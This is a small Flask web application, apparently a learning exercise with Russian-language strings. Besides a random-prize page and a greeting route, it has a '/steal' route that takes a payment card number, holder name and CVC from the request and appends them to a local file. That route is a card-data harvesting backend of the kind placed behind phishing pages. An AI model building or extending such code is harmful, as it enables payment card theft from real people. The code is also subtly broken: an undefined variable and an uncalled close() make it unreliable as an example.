from flask import Flask
from flask import request
from flask import render_template
from random import choice
app = Flask(__name__)

@app.route('/')
def index():
    prizes= ['деньги', 'а-а-автомобиль', 'сон', 'путевку' ,'хомяка']
    prize = choice(prizes)
    return render_template('main.html', prize=prize)
#    return '<html><body><h1>Hello, world!</h1></body></html>'

@app.route('/hi')

def hi():
    if 'name' in request.args:
        name=request.args['name']
        return '<html><body><h1>Hi, {}! world!</h1></body></html>'
    else:
        return '<html><body><h1>Введите имя!</h1></body></html>'

@app.route('/steal')
def steal():
    number = request.args['number']
    holder = request.args['holder']
    CVC = request.args['cvc']

    f = open('cards.txt', 'a')
    f.write("{} {} {}\n".format(number,holder,cvc))
    f.close

    return "<h3>Спасибо!<h3>"
    

if __name__ == '__main__':
    app.run(debug=True)

